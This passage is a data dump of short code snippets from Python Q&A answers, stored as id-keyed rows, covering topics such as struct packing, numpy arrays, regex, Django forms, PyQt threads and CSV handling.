</snippet></ROW><ROW><id>11991720</id><snippet>bin</snippet></ROW><ROW><id>11991720</id><snippet>include</snippet></ROW><ROW><id>11991720</id><snippet>lib</snippet></ROW><ROW><id>11991720</id><snippet>bin</snippet></ROW><ROW><id>11991720</id><snippet>pip</snippet></ROW><ROW><id>11991720</id><snippet>python</snippet></ROW><ROW><id>11991720</id><snippet>pip install pyramid</snippet></ROW><ROW><id>11991720</id><snippet>bin/pip install pyramid</snippet></ROW><ROW><id>11991720</id><snippet>bin/pip install pyramid</snippet></ROW><ROW><id>11991720</id><snippet>pyramid</snippet></ROW><ROW><id>11992014</id><snippet>2^10 &gt; 10^3
2^120 &gt; 10^36
2^127 &gt; 2^7*10^36
2^127 &gt; 100*10^36
2^127 &gt; 10^38
</snippet></ROW><ROW><id>11992064</id><snippet>os.system</snippet></ROW><ROW><id>11992064</id><snippet>ls</snippet></ROW><ROW><id>11992064</id><snippet>dir</snippet></ROW><ROW><id>11992064</id><snippet>/tmp/myfiles</snippet></ROW><ROW><id>11992064</id><snippet>tmp</snippet></ROW><ROW><id>11992069</id><snippet>struct.pack()</snippet></ROW><ROW><id>11992069</id><snippet>import struct

class TypeConv(object):
    BSA = '='  # native Byte order, standard Size, with no Alignment
    def __init__(self, conv_func, fmt_chr):
        self.__dict__.update(conv_func=conv_func, fmt_chr=fmt_chr)

    def pack(self, data):
        py_value = self.conv_func(data)
        count = str(len(py_value)) if self.conv_func is str else ''
        return struct.pack(self.BSA+count+self.fmt_chr, py_value)

type_conv = {'string': TypeConv(str, 's'),
             'int32': TypeConv(int, 'i'),
             'int64': TypeConv(long, 'q'),
             'float32': TypeConv(float, 'f'),
            }

array = [['string', 'int32', 'string', 'int64', 'float32', 'string', 'string'],
         ['any string', '19', 'any string', '198732132451654654',
          '0.6', 'any string', 'any string']]

binary_values = [type_conv[type_id].pack(data)
                     for type_id, data in zip(array[0], array[1])
                         if type_id in type_conv]  # to skip any unknown type_ids
print binary_values
</snippet></ROW><ROW><id>11992069</id><snippet>['any string', '\x13\x00\x00\x00', 'any string', '\xfe\x9b&lt;P\xd2\t\xc2\x02',
 '\x9a\x99\x19?', 'any string', 'any string']
</snippet></ROW><ROW><id>11992069</id><snippet>TypeConv.pack()</snippet></ROW><ROW><id>11992069</id><snippet>py_value</snippet></ROW><ROW><id>11992069</id><snippet>struct.pack()</snippet></ROW><ROW><id>11992595</id><snippet>ssh -t hostname python_script</snippet></ROW><ROW><id>11992595</id><snippet>ssh</snippet></ROW><ROW><id>11992595</id><snippet>ssh hostname</snippet></ROW><ROW><id>11992595</id><snippet>-t</snippet></ROW><ROW><id>11992704</id><snippet>#include &lt;numpy/arrayobject.h&gt;

void MyBaseClass::myCallback(const MyRecord&amp; data)
{
    object func = get_override("myCallback");
    if (func) {
        PyArray_Descr* dtype;
        PyObject* op = Py_BuildValue("[(s,s),(s,s),(s,s)]", "myInt", "&lt;u4", "myString", "|S4", "myDouble", "&lt;f8");
        PyArray_DescrConverter(op, &amp;dtype);
        Py_DECREF(op);
        PyObject* pya = PyArray_FromString(const_cast&lt;char*&gt;(reinterpret_cast&lt;const char*&gt;(&amp;data)), sizeof(data), dtype, 1, NULL);
        // PyObject_Print(pya, stdout, 0);
        numeric::array bpa(static_cast&lt;numeric::array&gt;(handle&lt;&gt;(pya)));
        func(bpa);
    }
}

BOOST_PYTHON_MODULE(example3)
{
    import_array()
    class_&lt;MyBaseClass&gt;("MyBaseClass")
        .def("myCallback", &amp;MyBaseClass::myCallback);
}
</snippet></ROW><ROW><id>11992947</id><snippet># pragma: no cover</snippet></ROW><ROW><id>11993020</id><snippet>doctest.py</snippet></ROW><ROW><id>11993020</id><snippet>def _test():
    testfiles = [arg for arg in sys.argv[1:] if arg and arg[0] != '-']
    if not testfiles:
        name = os.path.basename(sys.argv[0])
        if '__loader__' in globals():          # python -m
            name, _ = os.path.splitext(name)
        print("usage: {0} [-v] file ...".format(name))
        return 2
    for filename in testfiles:
        if filename.endswith(".py"):
            # It is a module -- insert its dir into sys.path and try to
            # import it. If it is part of a package, that possibly
            # won't work because of package imports.
            dirname, filename = os.path.split(filename)
            sys.path.insert(0, dirname)
            m = __import__(filename[:-3])
            del sys.path[0]
            failures, _ = testmod(m)
        else:
            failures, _ = testfile(filename, module_relative=False)
        if failures:
            return 1
    return 0


if __name__ == "__main__":
    sys.exit(_test())
</snippet></ROW><ROW><id>11993054</id><snippet>grep -r 'SYS_gettid' /usr/include/'</snippet></ROW><ROW><id>11993054</id><snippet>#define SYS_gettid __NR_gettid</snippet></ROW><ROW><id>11993054</id><snippet>grep -r '__NR_gettid' /usr/include/</snippet></ROW><ROW><id>11993054</id><snippet>/usr/include/x86_64-linux-gnu/asm/unistd_32.h:#define __NR_gettid 224
/usr/include/x86_64-linux-gnu/asm/unistd_64.h:#define __NR_gettid 186
/usr/include/asm-generic/unistd.h:#define __NR_gettid 178
</snippet></ROW><ROW><id>11993054</id><snippet>import ctypes
tid = ctypes.CDLL('libc.so.6').syscall(186)
</snippet></ROW><ROW><id>11993119</id><snippet>lambda</snippet></ROW><ROW><id>11993119</id><snippet>sorted(student_tuples, key=lambda x: (x[2],x[4],-x[0],x[1]))
                                                #^ This field will be 
                                                #  in descending order 
</snippet></ROW><ROW><id>11993119</id><snippet>s = sorted(student_tuples, key=itemgetter(1))
s.sort(key=itemgetter(0),reversed=True)
s.sort(key=itemgetter(2,4))
</snippet></ROW><ROW><id>11993119</id><snippet>import random
def rand_tuple():
    """ Return a random 5-tuple """
    return tuple( random.random() for _ in range(5) )

#100 random 5-tuples
lst = [ rand_tuple() for _ in range(100) ] 

#sort the list using method 1
sorted_lst = sorted(lst, key = lambda x: (x[2],x[4],-x[0],x[1])) 

#sort the list in place using method 2
lst.sort(key = itemgetter(1))  #&lt;- Rightmost tuple element first!!!
lst.sort(key = itemgetter(0), reversed = True)
lst.sort(key = itemgetter(2,4))

print (lst == sorted_lst) #True -- Results are the same :-)
</snippet></ROW><ROW><id>11993195</id><snippet>True</snippet></ROW><ROW><id>11993195</id><snippet>0</snippet></ROW><ROW><id>11993195</id><snippet>False</snippet></ROW><ROW><id>11993195</id><snippet>True</snippet></ROW><ROW><id>11993195</id><snippet>True</snippet></ROW><ROW><id>11993195</id><snippet>def TestFilter(x):
    if x &lt; 3: 
       return True
</snippet></ROW><ROW><id>11993195</id><snippet>a = [1, 2, 3, 0, 4, 8]
print filter(lambda x: x &lt; 3, a)
</snippet></ROW><ROW><id>11993250</id><snippet>&gt;&gt;&gt; def iequal(a, b):
...    try:
...       return a.upper() == b.upper()
...    except AttributeError:
...       return a == b
... 
&gt;&gt;&gt; 
&gt;&gt;&gt; iequal(2, 2)
True
&gt;&gt;&gt; iequal(4, 2)
False
&gt;&gt;&gt; iequal("joe", "Joe")
True
&gt;&gt;&gt; iequal("joe", "Joel")
False
</snippet></ROW><ROW><id>11993323</id><snippet>None</snippet></ROW><ROW><id>11993323</id><snippet>True</snippet></ROW><ROW><id>11993323</id><snippet>False</snippet></ROW><ROW><id>11993323</id><snippet>1</snippet></ROW><ROW><id>11993323</id><snippet>2</snippet></ROW><ROW><id>11993323</id><snippet>3</snippet></ROW><ROW><id>11993323</id><snippet>class ClinicalDataForm(forms.ModelForm):
    class Meta:
        model = ClinicalData

    def __init__(self, *args, **kwargs):
        super(ClinicalDataForm, self).__init__(*args, **kwargs)
        approved = self.fields['approved']
        approved.widget = forms.RadioSelect(
            choices=approved.widget.choices)
        approved.initial = '1'
</snippet></ROW><ROW><id>11993881</id><snippet>a</snippet></ROW><ROW><id>11993881</id><snippet>a[yidx,xidx]</snippet></ROW><ROW><id>11993881</id><snippet>velx, vely = np.gradient(a)</snippet></ROW><ROW><id>11993881</id><snippet>vely, velx = np.gradient(a)</snippet></ROW><ROW><id>11993881</id><snippet>vely</snippet></ROW><ROW><id>11993881</id><snippet>d/dy(a) = vely</snippet></ROW><ROW><id>11993881</id><snippet>a</snippet></ROW><ROW><id>11993881</id><snippet>a = X*Y
</snippet></ROW><ROW><id>11993904</id><snippet>list</snippet></ROW><ROW><id>11993904</id><snippet>list2</snippet></ROW><ROW><id>11993904</id><snippet>list2=list</snippet></ROW><ROW><id>11993904</id><snippet>id(list)
id(list2)
</snippet></ROW><ROW><id>11993904</id><snippet>&gt;&gt;&gt; list = [1, 2, 3, 4, 5]
&gt;&gt;&gt; list2 = list
&gt;&gt;&gt; id(list)
140496700844944
&gt;&gt;&gt; id(list2)
140496700844944
&gt;&gt;&gt; list.remove(3)
&gt;&gt;&gt; list
[1, 2, 4, 5]
&gt;&gt;&gt; list2
[1, 2, 4, 5]
</snippet></ROW><ROW><id>11993904</id><snippet>list</snippet></ROW><ROW><id>11993904</id><snippet>list2</snippet></ROW><ROW><id>11993904</id><snippet>list2 = list[:]
</snippet></ROW><ROW><id>11993904</id><snippet>&gt;&gt;&gt; list
[1, 2, 4, 5]
&gt;&gt;&gt; list2
[1, 2, 4, 5]
&gt;&gt;&gt; list = [1, 2, 3, 4, 5]
&gt;&gt;&gt; list2 = list[:]
&gt;&gt;&gt; id(list)
140496701034792
&gt;&gt;&gt; id(list2)
140496701034864
&gt;&gt;&gt; list.remove(3)
&gt;&gt;&gt; list
[1, 2, 4, 5]
&gt;&gt;&gt; list2
[1, 2, 3, 4, 5]
</snippet></ROW><ROW><id>11993904</id><snippet>list</snippet></ROW><ROW><id>11993904</id><snippet>list</snippet></ROW><ROW><id>11993904</id><snippet>list</snippet></ROW><ROW><id>11993904</id><snippet>list</snippet></ROW><ROW><id>11993904</id><snippet>&gt;&gt;&gt; list
&lt;type 'list'&gt;
&gt;&gt;&gt; type(list)
&lt;type 'type'&gt;
&gt;&gt;&gt; list = [1, 2, 3, 4, 5]
&gt;&gt;&gt; list
[1, 2, 3, 4, 5]
&gt;&gt;&gt; type(list)
&lt;type 'list'&gt;
</snippet></ROW><ROW><id>11993924</id><snippet>&gt;&gt;&gt; def tokenize(source):
...     search = re.compile(r'^(.+?)(?:;(.+?))*?(?:#.+)?$', re.MULTILINE)
...     return (token.strip() for line in source.split('\n') if search.match(line)
...                   for token in line.split('#', 1)[0].split(';') if token)
... 
&gt;&gt;&gt; 
&gt;&gt;&gt; 
&gt;&gt;&gt; for token in tokenize('''\
... a = 1 + 2; b = a - 3 # create zero in b
... c = b * 4; d = 5 / c # trigger div error
... 
... e = (6 + 7) * 8
... # try a boolean operation
... f = 0 and 1 or 2
... a; b; c; e; f'''):
...     print(repr(token))
... 
'a = 1 + 2'
'b = a - 3'
'c = b * 4'
'd = 5 / c'
'e = (6 + 7) * 8'
'f = 0 and 1 or 2'
'a'
'b'
'c'
'e'
'f'
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11993924</id><snippet>re.compile</snippet></ROW><ROW><id>11993924</id><snippet>def</snippet></ROW><ROW><id>11994007</id><snippet>smtplib</snippet></ROW><ROW><id>11994109</id><snippet>2012-08-15T00:00:00+00:00</snippet></ROW><ROW><id>11994452</id><snippet>request.session['form_data'] = user_info_form.data
</snippet></ROW><ROW><id>11994452</id><snippet>user_info_form = UserInfoForm(request.session['form_data'])
</snippet></ROW><ROW><id>11994687</id><snippet>re.sub</snippet></ROW><ROW><id>11994687</id><snippet>re.escape</snippet></ROW><ROW><id>11994687</id><snippet>def escape_repl(match):
    return '{0}[\W{0}]*'.format(re.escape(match.group(1)))

re.sub(r'([^\\])', escape_repl, string)
</snippet></ROW><ROW><id>11994687</id><snippet>&gt;&gt;&gt; print re.sub(r'([^\\])', escape_repl, '[^$]')
\[[\W\[]*\^[\W\^]*\$[\W\$]*\][\W\]]*
</snippet></ROW><ROW><id>11994944</id><snippet>In [193]: df
Out[193]:
            A  B  C  D
2012-08-16  2  1  1  7
2012-08-17  6  4  8  6
2012-08-18  8  3  1  1
2012-08-19  7  2  8  9
2012-08-20  6  7  5  8
2012-08-21  1  3  3  3
2012-08-22  8  2  3  8
2012-08-23  7  1  7  4
2012-08-24  2  6  0  6
2012-08-25  4  6  8  1

In [194]: row_pos = [2, 6, 9]

In [195]: df.ix[row_pos]
Out[195]:
            A  B  C  D
2012-08-18  8  3  1  1
2012-08-22  8  2  3  8
2012-08-25  4  6  8  1

In [196]: dates = [df.index[i] for i in row_pos]

In [197]: df.ix[dates]
Out[197]:
            A  B  C  D
2012-08-18  8  3  1  1
2012-08-22  8  2  3  8
2012-08-25  4  6  8  1
</snippet></ROW><ROW><id>11994965</id><snippet>sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=1,qd=DNSQR(qname="211.196.59.69.in-addr.arpa", qtype='PTR')))
</snippet></ROW><ROW><id>11995027</id><snippet>for dmt in response.iter('dmt'):
    val = [str(dmt.xpath('./%s/text()' % tag)) for tag in tags]
</snippet></ROW><ROW><id>11995027</id><snippet>str()</snippet></ROW><ROW><id>11995027</id><snippet>xpath()</snippet></ROW><ROW><id>11995027</id><snippet>str()</snippet></ROW><ROW><id>11995027</id><snippet>''.join()</snippet></ROW><ROW><id>11995027</id><snippet>for dmt in response.iter('dmt'):
    val = [''.join(dmt.xpath('./%s/text()' % tag)) for tag in tags]
</snippet></ROW><ROW><id>11995101</id><snippet>from PyQt4 import QtCore, QtGui
import time

class Window(QtGui.QDialog):

    def __init__(self):
        super(Window, self).__init__()
        self.resize(200,100)

        layout = QtGui.QVBoxLayout(self)

        layout.addWidget(QtGui.QLineEdit())

        self.button1 = QtGui.QPushButton("Sleep")
        self.button1.clicked.connect(self.go_safe)
        layout.addWidget(self.button1)

        self.button2 = QtGui.QPushButton("Crunch")
        self.button2.clicked.connect(self.go_GIL_buster)
        layout.addWidget(self.button2)

    def go_safe(self):
        t = QtCore.QThread(self)
        heavy = Heavy()
        heavy.moveToThread(t)
        t.started.connect(heavy.safe)
        print "starting thread"
        t.start()
        print "thread started"
        self.t1 = t
        self.heavy1 = heavy

    def go_GIL_buster(self):
        t = QtCore.QThread(self)
        heavy = Heavy()
        heavy.moveToThread(t)
        t.started.connect(heavy.GIL_buster)
        print "starting thread"
        t.start()
        print "thread started"
        self.t2 = t
        self.heavy2 = heavy

class Heavy(QtCore.QObject):

    def safe(self):
        print "Sleeping"
        time.sleep(10)
        print "Done"

    def GIL_buster(self):
        print "Crunching numbers"
        x = 2
        y = 500000000
        foo = x**y
        print "Done"


if __name__ == "__main__":
    app = QtGui.QApplication([])
    win = Window()
    win.show()
    win.raise_()
    app.exec_()
</snippet></ROW><ROW><id>11995101</id><snippet>class ScopedGILRelease
{
// C &amp; D ----------------------------
public:
    inline ScopedGILRelease()
    {
        m_thread_state = PyEval_SaveThread();
    }

    inline ~ScopedGILRelease()
    {
        PyEval_RestoreThread(m_thread_state);
        m_thread_state = NULL;
    }

private:
    PyThreadState * m_thread_state;
};
</snippet></ROW><ROW><id>11995101</id><snippet>int foo_wrapper(int x)
{
    ScopedGILRelease scoped;
    return foo(x);
}
</snippet></ROW><ROW><id>11995162</id><snippet>u</snippet></ROW><ROW><id>11995162</id><snippet>self.redirect(u'/test_result?spam_result=%s&amp;given_sentence=%s' % (spam_result, given_sentence))
</snippet></ROW><ROW><id>11995162</id><snippet>encode</snippet></ROW><ROW><id>11995252</id><snippet>import datetime
from threading import Timer

# dummy timestamp for testing, gong should be the 
# timestamp of the last keepAlive signal
gong = datetime.datetime(2012, 8, 16, 16, 3, 18, 341121)  

#seconds before kill check is performed
idle = 5

def bringOutYourDead():
    """If the last keep alive time stamp is more than 5 minutes ago, I am Audi 500."""
    stoneDeadIn =  5
    if datetime.datetime.now() - datetime.timedelta(minutes=stoneDeadIn) &gt;= gong:
        # I used print for whatever command for testing
        print('save_state_or_whatever()')
        print('gtk_main_quit()')
    else:
        print("I'm not dead yet!'")
    # recurse this as you see fit

dung = Timer(idle, bringOutYourDead)
dung.start()
</snippet></ROW><ROW><id>11995287</id><snippet>&gt;&gt;&gt; xi, yi, zi = [np.arange(3) for i in range(3)]
&gt;&gt;&gt; xx, yy, zz = np.broadcast_arrays(xi,yi[:,np.newaxis],zi[:,np.newaxis,np.newaxis])
&gt;&gt;&gt; xx.shape
(3, 3, 3)
&gt;&gt;&gt; xx.strides
(0, 0, 8)
</snippet></ROW><ROW><id>11995287</id><snippet>def ndmesh(*args):
   args = map(np.asarray,args)
   return np.broadcast_arrays(*[x[(slice(None),)+(None,)*i] for i, x in enumera\
te(args)])
</snippet></ROW><ROW><id>11995418</id><snippet>db.GqlQuery("..")</snippet></ROW><ROW><id>11995418</id><snippet>friend</snippet></ROW><ROW><id>11995418</id><snippet>{% for friend_tmp in friends %}
    {{friend_tmp.friend}}
    &lt;br&gt;
{%  endfor %}
</snippet></ROW><ROW><id>11995427</id><snippet>acceptedChars = set(string.digits + "[]()+-/*^=!&lt;&gt;" + string.letters)
newL = ''.join([ x for x in e if x in acceptedChars])
e = newL
</snippet></ROW><ROW><id>11995427</id><snippet>.</snippet></ROW><ROW><id>11995427</id><snippet>acceptedChars = set(string.digits + "[]()+-/*^=!&lt;&gt;." + string.letters)
newL = ''.join([ x for x in e if x in acceptedChars])
e = newL
</snippet></ROW><ROW><id>11995615</id><snippet>.</snippet></ROW><ROW><id>11995615</id><snippet>"\d+\.?\d*\^\d+\.?\d*"
</snippet></ROW><ROW><id>11995752</id><snippet>multipart/alternative</snippet></ROW><ROW><id>11995752</id><snippet>msg = MIMEMultipart('alternative')
</snippet></ROW><ROW><id>11995752</id><snippet>mixed</snippet></ROW><ROW><id>11995752</id><snippet>multipart/related</snippet></ROW><ROW><id>11995752</id><snippet>alternative</snippet></ROW><ROW><id>11995758</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt;
&gt;&gt;&gt; re.sub(r'\[(\d+)\]', r'\[\1\]', 'Foo[123].bar[x]')
'Foo\\[123\\].bar[x]'
</snippet></ROW><ROW><id>11996004</id><snippet>import re

regexes = {
  "text": re.compile(r"(.+?)(?:$|\b(?=(Alt|Shft|Spc|Ctrl|Ret|BkSpc|Tab|CpsLk|NmLk|ScrlLk|PgUp|PgDwn|Home|End|Del|Ins|Win|F1?[1-9])\b))"),
  "kwd": re.compile(r"(Alt|Shft|Spc|Ctrl|Ret|BkSpc|Tab|CpsLk|NmLk|ScrlLk|PgUp|PgDwn|Home|End|Del|Ins|Win|F1?[1-9])\b")
}

def tokenise(state):
  while state["src"]:
    state["tok"] = "text" if state["tok"] == "kwd" else "kwd"
    #print "mode: {0:20} {1!r}".format(state["tok"].capitalize(), state["src"])

    m = regexes[state["tok"]].match(state["src"])
    if m:
      match = m.group(0)
      state["src"] = state["src"][m.end():]
      #print "  TOKEN({0}, {1!r})".format(state["tok"], match)
      yield "TOKEN({0}, {1!r})".format(state["tok"], match)


state = {
  "src": "A thing that, Tab, is AltCps or 'Win'. F8 is good, as is: F13.",
  "tok": "text"
}
print repr(state["src"])
print "\n".join(list(tokenise(state)))
print

state = {
  "src": "Alt thing that, Tab, is AltCps or 'Win'. F8 is good, as is: F13.",
  "tok": "text"
}
print repr(state["src"])
print "\n".join(list(tokenise(state)))
print

state = {
  "src": "Alt thing that, Tab, is AltCps or 'Win'. F8 is good, as is: F11",
  "tok": "text"
}
print repr(state["src"])
print "\n".join(list(tokenise(state)))
print
</snippet></ROW><ROW><id>11996090</id><snippet>&gt;&gt;&gt; import pymongo
&gt;&gt;&gt; import uuid
&gt;&gt;&gt; c = pymongo.Connection()
&gt;&gt;&gt; uu = uuid.uuid4()
&gt;&gt;&gt; uu
UUID('14a2aad7-fa01-40a4-8a80-04242b946ee4')
&gt;&gt;&gt; c.test.uuidtest.insert({'_id': uu})
UUID('14a2aad7-fa01-40a4-8a80-04242b946ee4')
&gt;&gt;&gt; c.test.uuidtest.find_one()
{u'_id': UUID('14a2aad7-fa01-40a4-8a80-04242b946ee4')}
</snippet></ROW><ROW><id>11996126</id><snippet>{% macro render_field(field) %}
  &lt;dt&gt;{{ field.label }}
  &lt;dd&gt;{{ field(title=field.description, **kwargs)|safe }}
  {% if field.errors %}
    &lt;ul class=errors&gt;
    {% for error in field.errors %}
      &lt;li&gt;{{ error }}&lt;/li&gt;
    {% endfor %}
    &lt;/ul&gt;
  {% endif %}
  &lt;/dd&gt;
{% endmacro %}
</snippet></ROW><ROW><id>11996231</id><snippet>'XFStyle' object is not callable</snippet></ROW><ROW><id>11996231</id><snippet>sheet.write</snippet></ROW><ROW><id>11996231</id><snippet>new_sheet.write(row_index,col_index, iSheet.cell(row_index,col_index).value, fill_grey_style())
</snippet></ROW><ROW><id>11996231</id><snippet>new_sheet.write(row_index,col_index, iSheet.cell(row_index,col_index).value, fill_grey_style)
</snippet></ROW><ROW><id>11996422</id><snippet>IOBucket</snippet></ROW><ROW><id>11996422</id><snippet>BTree</snippet></ROW><ROW><id>11996422</id><snippet>ConflictError</snippet></ROW><ROW><id>11996422</id><snippet>transaction.begin()</snippet></ROW><ROW><id>11996422</id><snippet>.begin()</snippet></ROW><ROW><id>11996423</id><snippet>sqlite_master</snippet></ROW><ROW><id>11996423</id><snippet>SELECT name FROM sqlite_master WHERE type='table';
</snippet></ROW><ROW><id>11996423</id><snippet>SELECT * FROM table_name LIMIT 1;
</snippet></ROW><ROW><id>11996790</id><snippet>def cmpdirs(dir_cmp):
    # make copies of the comparison results
    left   = dir_cmp.left_only[:]
    right  = dir_cmp.righ_only[:]
    common = dir_cmp.common_files[:]

    for sub_dcmp in dir_cmp.subdirs.values():
        sub_left, sub_right, sub_common = cmpdirs(sub_dcmp)

        # join the childrens results
        left   += sub_left
        right  += sub_right
        common += sub_common

    # return the merged results
    return (left, right, common)

if __name__ == '__main__':
    dcmp   = dircmp('dir1', 'dir2')
    result = cmpdirs(dcmp)
</snippet></ROW><ROW><id>11996826</id><snippet>counter</snippet></ROW><ROW><id>11996826</id><snippet>import os, sys

# Specify directory
# In your case, you may want something like the following
my_directory = 'C:/Users/&lt;user_name&gt;/Documents/ZoneA'

# Define the counter
counter = 1

# Start the loop
for folder, sub_folders, files in os.walk(my_directory):
  for special_file in files:
    if special_file == 'math.txt':
      file_path = os.path.join(folder, special_file)

      # Open and read
      with open(file_path, 'r+') as read_file:
        print('Reading math txt file ' + str(counter))

        # Print the file
        for line in read_file:
           print(line)

        # Increment the counter
        counter += 1
</snippet></ROW><ROW><id>11996839</id><snippet># after all your code
add_items(self.tree_widget, self.xml)

# select the root item
self.tree_widget.setCurrentItem(self.tree_widget.topLevelItem(0))
</snippet></ROW><ROW><id>11996839</id><snippet>import lxml.etree as et

#...

self.xml = et.XML(filters.filtersxml)
self.tree_widget = QTreeWidget(parent)

def add_items(parent, xmlroot):
    output = []
    for i in xmlroot.getchildren():
        item = QTreeWidgetItem(parent, [i.get('name')])
        output.append(item)
        if len(i.getchildren()) != 0:
            add_items(item, i)
    return output

items = add_items(None, self.xml)
self.tree_widget.addTopLevelItems(items)
self.tree_widget.setCurrentItem(items[0])
</snippet></ROW><ROW><id>11996839</id><snippet>import lxml.etree as et

#...

self.xml = et.XML(filters.filtersxml)
self.tree_widget = QTreeWidget(parent)

def create_item(parent, xmlroot):
    item = QTreeWidgetItem(parent, [xmlroot.get('name')])
    for xmlchild in xmlroot.getchildren():
       create_item(item, xmlchild)
    return item

items = [create_item(None, xmlchild) for xmlchild in self.xml.getchildren()]
self.tree_widget.addTopLevelItems(items)
if ( items ):
    self.tree_widget.setCurrentItem(items[0])
</snippet></ROW><ROW><id>11996839</id><snippet>import lxml.etree as et
from PyQt4.QtGui import QTreeWidgetItem

# ...    

class XmlTreeWidgetItem(QTreeWidgetItem):
    def __init__( self, parent, xmlitem ):
        super(MyTreeWidgetItem, self).__init__(parent)
        self.setText(0, xmlitem.get('name'))
        self.setChildIndicatorPolicy(self.ShowIndicator)

        self._xmlitem = xmlitem
        self._loaded = False

    def loadChildren( self ):
        if ( self._loaded ):
            return

        self._loaded = True
        self.setChildIndicatorPolicy(self.DontShowIndicatorWhenChildless)
        for xmlchild in self._xmlitem.getchildren():
            XmlTreeWidgetItem(self, xmlchild)

# ...

class SomeClass(QWidget):
    def __init__( self, parent = None ):
        super(SomeClass, self).__init__(parent)

        self.tree_widget = QTreeWidget(parent)

        xml = et.XML(filters.filtersxml)
        items = [XmlTreeWidgetItem(None, xchild) for xchild in xml.getchildren()]
        self.tree_widget.addTopLevelItems(items)
        if ( items ):
            self.tree_widget.setCurrentItem(items[0])

        # create connections
        self.tree_widget.itemExpanded.connect(self.loadItem)

    def loadItem( self, item ):
        item.loadChildren()
</snippet></ROW><ROW><id>11996869</id><snippet>@</snippet></ROW><ROW><id>11996869</id><snippet>\b</snippet></ROW><ROW><id>11996869</id><snippet>re.sub('(\\ba|@)(\\W|[a@])*[s5$](\\W|[s5$])*[s5$](\\W|[s5$])*($|\\W)', '*', '@ss')
</snippet></ROW><ROW><id>11996869</id><snippet>\b[a@]</snippet></ROW><ROW><id>11996869</id><snippet>(\ba|@)</snippet></ROW><ROW><id>11997188</id><snippet>save</snippet></ROW><ROW><id>11997188</id><snippet>class Product(models.Model):
    ...
    def save(self, *args, **kwargs):
        for field_name in ['title', 'price', ... ]:
            val = getattr(self, field_name, False)
            if val:
                setattr(self, field_name, val.capitalize())
        super(Product, self).save(*args, **kwargs)
</snippet></ROW><ROW><id>11997310</id><snippet>and</snippet></ROW><ROW><id>11997310</id><snippet>EST/EST_Version[Master_Type_HD_SD='HD'][Version_Type='Standard']/Vendor_ID
</snippet></ROW><ROW><id>11997310</id><snippet>and</snippet></ROW><ROW><id>11997310</id><snippet>EST/EST_Version[Master_Type_HD_SD='HD' and Version_Type='Standard']/Vendor_ID
</snippet></ROW><ROW><id>11998433</id><snippet>import csv
import sys
with open('filename.csv') as fin:
    csvout = csv.writer(sys.stdout, delimiter='|')
    for row in csv.reader(fin):
        csvout.writerow(row)
</snippet></ROW><ROW><id>11998433</id><snippet>cols_to_output = {}
for row in csv.reader(fin):
    for colno, col in enumerate(row):
        output_to = cols_to_output.setdefault(colno, open('column_output.{}'.format(colno), 'wb')
        csv.writer(output_to).writerow(row)

for fileno in cols_to_output.itervalues():
    fileno.close()
</snippet></ROW><ROW><id>11998575</id><snippet>for D in L:
  del D['item1']
</snippet></ROW><ROW><id>11998672</id><snippet>Image</snippet></ROW><ROW><id>11998672</id><snippet>ImageOps</snippet></ROW><ROW><id>11998672</id><snippet>ImageDraw</snippet></ROW><ROW><id>11998672</id><snippet>PIL</snippet></ROW><ROW><id>11998731</id><snippet>put</snippet></ROW><ROW><id>11998731</id><snippet>decode</snippet></ROW><ROW><id>11998731</id><snippet>encode</snippet></ROW><ROW><id>11998731</id><snippet>put</snippet></ROW><ROW><id>11998731</id><snippet>decode('utf-8')</snippet></ROW><ROW><id>11998731</id><snippet>decode('latin1')</snippet></ROW><ROW><id>11998731</id><snippet>decode()</snippet></ROW><ROW><id>11998731</id><snippet>encode()</snippet></ROW><ROW><id>11998731</id><snippet>utf-8</snippet></ROW><ROW><id>11998731</id><snippet>latin-1</snippet></ROW><ROW><id>11998731</id><snippet>&gt;&gt;&gt; s = 'Chávez'
&gt;&gt;&gt; type(s)
&lt;type 'str'&gt;
&gt;&gt;&gt; u = s.decode('latin1')
&gt;&gt;&gt; type(u)
&lt;type 'unicode'&gt;
&gt;&gt;&gt; e = u.encode('latin1')
&gt;&gt;&gt; print e
Chávez
</snippet></ROW><ROW><id>11998731</id><snippet>latin1</snippet></ROW><ROW><id>11998731</id><snippet>utf-8</snippet></ROW><ROW><id>11998733</id><snippet>class Empty(object):

    def __init__(self, **kwargs):
        object.__setattr__(self, '_obj', kwargs)

    def __getattribute__(self, name):
        obj = object.__getattribute__(self, '_obj')
        try:
            return obj[name]
        except KeyError:
            cls_name = object.__getattribute__(self, '__class__').__name__
            raise AttributeError(
                "'%(cls_name)s' object has no attribute '%(name)s'" % locals())

    def __setattr__(self, name, val):
        obj = object.__getattribute__(self, '_obj')
        obj[name] = val

    def __getitem__(self, key):
        return getattr(self, key)

    def __setitem__(self, key, val):
        return setattr(self, key, val)
</snippet></ROW><ROW><id>11998733</id><snippet>e = Empty(initial='optional-value')
e.initial
# 'optional-value'
e.val = 'foo'
e.val
# 'foo'
e.bad
# AttributeError: 'Empty' object has no attribute 'bad'
setattr(e, 'user', 'jdi')
e.user
# 'jdi'
e['user']
# 'jdi'

# note that you dont even see anything when you dir()
dir(e)
# []

# and trying to access _obj is protected
e._obj
#AttributeError: 'Empty' object has no attribute '_obj'

# But you could even set your own _obj attribute
e._obj = 1
e._obj
# 1
</snippet></ROW><ROW><id>11998733</id><snippet>_obj</snippet></ROW><ROW><id>11998878</id><snippet>Meta.db_table</snippet></ROW><ROW><id>11998977</id><snippet>openssl-devel</snippet></ROW><ROW><id>11998977</id><snippet>libpcap-devel</snippet></ROW><ROW><id>11998977</id><snippet>yum</snippet></ROW><ROW><id>11998977</id><snippet>build/temp.linux-i686-2.6/</snippet></ROW><ROW><id>11999063</id><snippet>import numpy as np
A = np.random.rand(1000,3,3)
def slow_inverse(A): 
    Ainv = np.zeros_like(A)

    for i in range(A.shape[0]):
        Ainv[i] = np.linalg.inv(A[i])
    return Ainv

def fast_inverse(A):
    identity = np.identity(A.shape[2], dtype=A.dtype)
    Ainv = np.zeros_like(A)

    for i in range(A.shape[0]):
        Ainv[i] = np.linalg.solve(A[i], identity)
    return Ainv

def fast_inverse2(A):
    identity = np.identity(A.shape[2], dtype=A.dtype)

    return array([np.linalg.solve(x, identity) for x in A])

from numpy.linalg import lapack_lite
lapack_routine = lapack_lite.dgesv
# Looking one step deeper, we see that solve performs many sanity checks.  
# Stripping these, we have:
def faster_inverse(A):
    b = np.identity(A.shape[2], dtype=A.dtype)

    n_eq = A.shape[1]
    n_rhs = A.shape[2]
    pivots = zeros(n_eq, np.intc)
    identity  = np.eye(n_eq)
    def lapack_inverse(a):
